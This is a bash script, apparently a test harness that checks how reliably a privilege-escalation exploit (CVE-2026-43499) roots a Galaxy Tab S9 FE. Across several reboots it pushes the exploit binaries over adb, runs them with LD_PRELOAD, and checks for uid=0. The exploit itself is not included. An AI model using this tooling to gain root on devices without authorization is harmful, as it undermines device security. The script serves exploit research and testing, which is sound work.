#!/bin/bash
# Regression test for Galaxy Tab S9 FE root exploit
# Tests root success across multiple reboots

RESULTS_FILE="regression_results.txt"
PASS_COUNT=0
FAIL_COUNT=0
TOTAL_TESTS=5  # Number of reboots to test

echo "=== Galaxy Tab S9 FE Root Regression Test ===" | tee $RESULTS_FILE
echo "Start time: $(date)" | tee -a $RESULTS_FILE
echo "Total tests planned: $TOTAL_TESTS" | tee -a $RESULTS_FILE
echo "" | tee -a $RESULTS_FILE

for test_num in $(seq 1 $TOTAL_TESTS); do
    echo ""
    echo "=== TEST $test_num/$TOTAL_TESTS ===" | tee -a $RESULTS_FILE
    echo "Time: $(date)" | tee -a $RESULTS_FILE
    
    # Reboot
    echo "Rebooting..." | tee -a $RESULTS_FILE
    adb reboot
    adb wait-for-device
    echo "Waiting for boot to complete..." | tee -a $RESULTS_FILE
    sleep 45  # Let device fully boot
    
    # Verify boot
    BOOT_COMPLETED=$(adb shell "getprop sys.boot_completed" 2>/dev/null | tr -d '\r')
    if [ "$BOOT_COMPLETED" != "1" ]; then
        echo "WAIT: Boot not complete, waiting 30 more seconds..." | tee -a $RESULTS_FILE
        sleep 30
    fi
    
    # Record boot info
    UPTIME=$(adb shell "cat /proc/uptime" 2>/dev/null | awk '{print $1}')
    echo "Uptime: $UPTIME seconds" | tee -a $RESULTS_FILE
    
    # Push binaries
    echo "Pushing binaries..." | tee -a $RESULTS_FILE
    adb push build/gts9fewifi-X510XXSEEZG3/cve-2026-43499-app.so /data/local/tmp/ 2>/dev/null
    adb push build/gts9fewifi-X510XXSEEZG3/cve-2026-43499-root /data/local/tmp/ 2>/dev/null
    adb shell chmod 755 /data/local/tmp/cve-2026-43499-app.so 2>/dev/null
    adb shell chmod 755 /data/local/tmp/cve-2026-43499-root 2>/dev/null
    
    # Run exploit with timeout
    echo "Running exploit (max 30 min timeout)..." | tee -a $RESULTS_FILE
    START_TIME=$(date +%s)
    
    timeout 1800 adb shell "cd /data/local/tmp && CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root LD_PRELOAD=./cve-2026-43499-app.so /system/bin/toybox id" > test_${test_num}_output.txt 2>&1
    
    END_TIME=$(date +%s)
    DURATION=$((END_TIME - START_TIME))
    echo "Exploit duration: ${DURATION}s" | tee -a $RESULTS_FILE
    
    # Check for success
    if grep -q "root=1" test_${test_num}_output.txt; then
        echo "RESULT: ✅ SUCCESS" | tee -a $RESULTS_FILE
        PASS_COUNT=$((PASS_COUNT + 1))
    else
        echo "RESULT: ❌ FAILED" | tee -a $RESULTS_FILE
        FAIL_COUNT=$((FAIL_COUNT + 1))
    fi
    
    # Verify root
    echo "Verifying root..." | tee -a $RESULTS_FILE
    ROOT_CHECK=$(adb shell "/data/local/tmp/cve-2026-43499-root -c id" 2>/dev/null | grep "uid=0")
    if [ -n "$ROOT_CHECK" ]; then
        echo "Root verified: $ROOT_CHECK" | tee -a $RESULTS_FILE
    else
        echo "Root verification failed" | tee -a $RESULTS_FILE
    fi
    
    echo "" | tee -a $RESULTS_FILE
    
    # Kill any lingering processes
    adb shell "pkill -9 -f toybox" 2>/dev/null
    adb shell "pkill -9 -f cve" 2>/dev/null
    sleep 5
done

echo "" | tee -a $RESULTS_FILE
echo "=== REGRESSION TEST COMPLETE ===" | tee -a $RESULTS_FILE
echo "Pass: $PASS_COUNT/$TOTAL_TESTS" | tee -a $RESULTS_FILE
echo "Fail: $FAIL_COUNT/$TOTAL_TESTS" | tee -a $RESULTS_FILE
echo "End time: $(date)" | tee -a $RESULTS_FILE
